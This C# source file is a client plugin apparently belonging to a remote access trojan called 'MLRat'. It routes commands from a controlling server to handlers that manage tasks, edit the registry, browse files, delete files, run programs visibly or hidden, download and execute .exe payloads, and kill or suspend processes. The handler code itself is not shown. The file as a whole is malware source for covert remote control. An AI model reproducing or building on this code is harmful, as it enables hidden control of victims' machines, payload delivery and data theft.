using MLManagementClient.Handlers;
using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MLManagementClient
{
    public class ClientPlugin : IClientPlugin
    {
        IClientConnection NetworkHost = null;
        public void OnConnect()
        {
            
        }

        public void OnDataRecieved(object[] data)
        {
            NetworkCommand command = (NetworkCommand)data[0];

            Console.WriteLine("NetworkCommand: {0}", command.ToString());

            if (command == NetworkCommand.TaskManager) TaskManagerHandler.Handle(data);
            if (command == NetworkCommand.Ping) NetworkHost.Send((byte)NetworkCommand.Pong);
            if (command == NetworkCommand.RegistryEdit) RegistryEditorHandler.Handle(data);
            if (command == NetworkCommand.FileManager) FileManagerHandler.Handle(data);
            if (command == NetworkCommand.Close) Environment.Exit(0);

            if (command == NetworkCommand.Execute) MiscHandler.Execute((string)data[1]);
            if (command == NetworkCommand.ExecuteHidden) MiscHandler.ExecuteHidden((string)data[1]);
            if (command == NetworkCommand.DeleteFile) MiscHandler.DeleteFile((string)data[1]);
            if (command == NetworkCommand.DownloadAndExecute) MiscHandler.DownloadAndExecute((string)data[1], ".exe");
            if (command == NetworkCommand.DownloadFile) MiscHandler.DownloadFile((string)data[1], (string)data[2]);
            if (command == NetworkCommand.KillProcess) MiscHandler.KillProcess((int)data[1]);
            if (command == NetworkCommand.SuspendProcess) MiscHandler.SuspendProcess((int)data[1]);
            if (command == NetworkCommand.ResumeProcess) MiscHandler.ResumeProcess((int)data[1]);
        }

        public void OnDisconnect()
        {
            
        }

        public void OnPluginLoad(IClientConnection server)
        {
            NetworkHost = server;
            TaskManagerHandler.SetNetworkHost(NetworkHost);
            RegistryEditorHandler.SetNetworkHost(NetworkHost);
            FileManagerHandler.SetNetworkHost(NetworkHost);
        }
    }
}
